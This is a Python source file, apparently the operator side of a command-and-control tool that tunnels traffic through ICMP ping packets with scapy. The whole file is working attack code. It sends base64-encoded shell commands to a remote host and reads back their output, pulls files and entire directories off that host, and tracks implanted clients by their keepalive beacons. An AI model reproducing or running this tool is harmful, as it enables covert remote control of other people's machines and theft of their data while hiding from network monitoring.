from scapy.all import *
from threading import Thread
import base64
import subprocess
import time
import os

sniffInterface = "VMware Network Adapter VMnet8"
destination = "192.168.18.129"
keptAliveClients = dict() # Map
maxKeepAlive = 30


def keepAlive():
    while(True):
        #print("[KeepAlive] Kept alive clients : " + str(keptAliveClients)+"\n")
        a = sniff(iface=sniffInterface, filter="icmp", count=1)
        if len(a[0]) > 2:
            receivedMessage = a[0][3].fields.get("load").decode("utf-8")
            if receivedMessage == "keepAlive":
                src = a[0][1].fields.get("src")
                #print("[KeepAlive] Added to kept alive "+src+"\n")
                keptAliveClients[src] = time.time()

def trimKeptAlive():
    while True:
        time.sleep(maxKeepAlive)
        #print("[KeepAliveTrim] Trimming kept alive clients ...\n")
        now = time.time()
        duplicateClients = dict(keptAliveClients)
        for key in duplicateClients:
            if now - keptAliveClients[key] >= maxKeepAlive:
                #print("[KeepAliveTrim] Deleting "+key+" from kept alive...\n")
                del keptAliveClients[key]
        

# @return ICMP message's bytes
def sniffMessage():
    while(True):
        a = sniff(iface=sniffInterface, filter="icmp", count=1)

        # 8 is echo-request and only listen for those
        if a[0][2].fields.get("type") == 8:
            return a[0][3].fields.get("load")


# Send echo-reply
def sendMessage(destination, string):
    p = sr1(IP(dst=destination)/ICMP(type=0, id=1, seq=1)/string, timeout=0)

def recvFile(clientPath):
    print("recvFile | clientPath: "+clientPath)
    
    fileName = sniffMessage().decode("utf-8")
    osFile = os.getcwd() + "/" + fileName.replace(clientPath, "")
    base64File = sniffMessage()

    print("osFile : "+osFile)
    print("base64File : "+base64File.decode("utf-8"))

    if not os.path.exists(osFile):
        with open(osFile, "wb") as fh:
            fh.write(base64.decodebytes(base64File))
    else:
        print("That file already exists ! Consider removing it")

def recvDirectory(clientPath):
    print("recvDirectory | clientPath: "+clientPath)
    fileType = sniffMessage().decode("utf-8")
    
    while fileType == "file" or fileType == "directory":

        print("fileType: "+fileType)
        
        if fileType == "file":
            recvFile(clientPath)
        else:
            path = sniffMessage().decode("utf-8")
            print("path: " + path)
            osPath = os.getcwd() + "/" + path.replace(clientPath, "")
            print("osPath: "+osPath)
            if not os.path.exists(osPath):
                os.makedirs(osPath)
            else:
                print("That folder already exists ! Consider removing it")

        fileType = sniffMessage().decode("utf-8")
        
    print("Finished receiving directory")
    

if __name__ == "__main__":
    keepAliveThread = Thread(target = keepAlive)
    keepAliveThread.start()

    trimkeepAliveThread = Thread(target = trimKeptAlive)
    trimkeepAliveThread.start()
    
    while True:

        action = input("What should we do ? file | command | message | directory ? ")
        sendMessage(destination, action)

        print("Selected action : "+action)

        if action == "file":

            fileName = input("Which file should we get ?\n")
            sendMessage(destination, fileName)
            
            recvFile("")

        elif action == "command":
            
            command = input("What command should we run ? ")
            encodedCommand = base64.b64encode(command.encode('utf-8'))

            # Protocole : type d'envoi (file/message)
            sendMessage(destination, encodedCommand)

            base64Output = sniffMessage().decode("utf-8")
            print("base64Output: "+base64Output)
            print(base64.b64decode(base64Output))

        elif action == "message":
            message = input("What message should we send ? ")
            sendMessage(destination, message)

        elif action == "directory":
            
            directory = input("Which directory should we get ? ")
            encodedDirectory = base64.b64encode(directory.encode('utf-8'))

            sendMessage(destination, encodedDirectory)
            
            recvDirectory(directory)

            
            
        elif action != "keepAlive":
            print("Received unknown message "+action)







